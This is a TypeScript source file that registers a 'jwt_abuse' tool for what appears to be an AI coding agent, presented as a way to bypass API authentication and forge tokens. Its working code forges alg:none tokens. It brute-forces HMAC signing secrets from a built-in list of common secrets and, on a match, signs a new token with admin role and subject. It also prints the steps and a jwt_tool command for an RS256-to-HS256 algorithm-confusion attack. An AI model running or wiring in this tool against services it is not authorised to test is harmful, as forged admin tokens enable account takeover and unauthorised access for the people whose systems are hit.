export * as JwtAbuseTool from "./jwt-abuse"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "jwt_abuse"

export const Input = Schema.Struct({
  jwt: Schema.String.annotate({ description: "The JWT token to analyze and attack" }),
  action: Schema.String.pipe(Schema.optional).annotate({
    description: "Attack: 'analyze' (decode and inspect, default), 'none' (alg:none bypass), 'crack' (brute force secret), 'rs256_to_hs256' (algorithm confusion attack), 'weak_key' (try common secrets), 'all' (run every attack)",
  }),
  wordlist: Schema.String.pipe(Schema.optional).annotate({
    description: "Wordlist for secret cracking. Default: common secrets list.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

const COMMON_SECRETS = "secret,password,123456,key,jwt,token,admin,test,debug,development,changeme,default,abc123,letmein,supersecret,jwt-secret,my-secret,secretkey,your-256-bit-secret,your-secret-key,secret123,key123,passphrase,signature,verify,auth,oauth,openid"

function base64UrlDecode(str: string): string {
  const pad = str.length % 4 === 0 ? "" : "=".repeat(4 - (str.length % 4))
  const base64 = str.replace(/-/g, "+").replace(/_/g, "/") + pad
  try {
    return Buffer.from(base64, "base64").toString("utf8")
  } catch {
    return ""
  }
}

function base64UrlEncode(str: string): string {
  return Buffer.from(str).toString("base64").replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_")
}

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools.register({
      [name]: Tool.make({
        description: `JWT (JSON Web Token) vulnerability testing. Decodes and analyzes tokens, tests algorithm:none bypass, cracks HMAC secrets with wordlists, performs RS256→HS256 algorithm confusion attacks, and tries common weak secrets. Essential for API authentication bypass and token forgery.`,
        input: Input,
        output: Output,
        toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
        execute: (input) =>
          Effect.gen(function* () {
            const parts = input.jwt.split(".")
            if (parts.length < 2) {
              return { output: "ERROR: Invalid JWT format. Expected header.payload.signature" }
            }

            const header = JSON.parse(base64UrlDecode(parts[0]) || "{}")
            const payload = JSON.parse(base64UrlDecode(parts[1]) || "{}")
            const action = input.action ?? "analyze"
            const results: string[] = []

            results.push("=== JWT ANALYSIS ===")
            results.push(`Header: ${JSON.stringify(header, null, 2)}`)
            results.push(`Payload: ${JSON.stringify(payload, null, 2)}`)
            results.push(`Algorithm: ${header.alg ?? "unknown"}`)
            results.push(`Signature present: ${parts[2]?.length > 0}`)
            results.push("")

            if (action === "analyze" || action === "all") {
              // Security analysis
              results.push("--- SECURITY ANALYSIS ---")
              if (header.alg === "none" || header.alg === "None" || header.alg === "NONE") {
                results.push("[VULNERABLE] Algorithm is 'none' — server accepts unsigned tokens!")
              }
              if (header.alg === "HS256") {
                results.push("[INFO] HS256 algorithm — vulnerable to secret brute force")
              }
              if (header.alg === "RS256") {
                results.push("[INFO] RS256 algorithm — test for algorithm confusion attack (RS256→HS256)")
              }
              if (!header.kid && !header.x5u && !header.jku) {
                results.push("[INFO] No key injection parameters in header")
              } else {
                results.push(`[WARNING] Key injection parameter found: kid=${header.kid}, x5u=${header.x5u}, jku=${header.jku}`)
              }
              if (payload.exp) {
                const expTime = new Date(payload.exp * 1000)
                const expired = expTime < new Date()
                results.push(`[INFO] Expires: ${expTime.toISOString()} ${expired ? "(EXPIRED)" : ""}`)
              } else {
                results.push("[VULNERABLE] No expiration claim — token valid forever")
              }
              if (!payload.iat) results.push("[INFO] No 'issued at' claim")
              if (!payload.aud) results.push("[INFO] No audience restriction")
              results.push("")
            }

            if (action === "none" || action === "all") {
              results.push("--- ALGORITHM:NONE BYPASS ---")
              const noneHeader = base64UrlEncode(JSON.stringify({ ...header, alg: "none" }))
              const noneToken = `${noneHeader}.${parts[1]}.`
              results.push(`Forged token (alg:none):`)
              results.push(noneToken)
              results.push("[INFO] Use this token in the Authorization header. If the server accepts it, auth bypass is confirmed.")
              results.push("")
            }

            if (action === "weak_key" || action === "crack" || action === "all") {
              results.push("--- WEAK SECRET BRUTE FORCE ---")
              const wordlist = (input.wordlist ?? COMMON_SECRETS).split(",")
              let cracked: string | null = null

              for (const secret of wordlist) {
                // Use Node crypto to verify HMAC
                const { createHmac } = yield* Effect.promise(async () => await import("node:crypto"))
                const hmac = createHmac("sha256", secret.trim())
                const data = `${parts[0]}.${parts[1]}`
                hmac.update(data)
                const expectedSig = base64UrlEncode(hmac.digest())
                if (expectedSig === parts[2]) {
                  cracked = secret.trim()
                  break
                }
              }

              if (cracked) {
                results.push(`🎉 SECRET CRACKED: "${cracked}"`)
                results.push("[CRITICAL] Server uses a weak JWT secret. You can now forge valid tokens for any user.")
                // Generate a forged admin token
                const adminPayload = { ...payload, role: "admin", admin: true, sub: "admin" }
                const { createHmac: hmac2 } = yield* Effect.promise(async () => await import("node:crypto"))
                const adminHeader = base64UrlEncode(JSON.stringify(header))
                const adminBody = base64UrlEncode(JSON.stringify(adminPayload))
                const h = hmac2("sha256", cracked)
                h.update(`${adminHeader}.${adminBody}`)
                const adminSig = base64UrlEncode(h.digest())
                results.push(`\nForged admin token:`)
                results.push(`${adminHeader}.${adminBody}.${adminSig}`)
              } else {
                results.push("[INFO] Secret not in common list. Try a larger wordlist with hash_crack or jwt_tool.")
              }
              results.push("")
            }

            if (action === "rs256_to_hs256" || action === "all") {
              results.push("--- RS256→HS256 ALGORITHM CONFUSION ---")
              results.push("If the server uses RS256 (asymmetric) but doesn't enforce the algorithm:")
              results.push("1. Obtain the server's public RSA key (usually at /.well-known/jwks.json or /oauth/public_key)")
              results.push("2. Re-sign the token using HS256 with the public key as the HMAC secret")
              results.push("3. The server will verify using the public key as HMAC secret — bypassing signature validation")
              results.push("")
              results.push("Forged header:")
              const confusedHeader = base64UrlEncode(JSON.stringify({ ...header, alg: "HS256" }))
              results.push(confusedHeader)
              results.push(`\nUse jwt_tool to perform: python3 jwt_tool.py ${input.jwt} -X k -pk public_key.pem`)
              results.push("")
            }

            results.push("=== END JWT ANALYSIS ===")
            return { exit: 0, output: results.join("\n") }
          }).pipe(Effect.mapError(() => new ToolFailure({ message: "JWT abuse failed" }))),
      }),
    }).pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/jwt-abuse",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
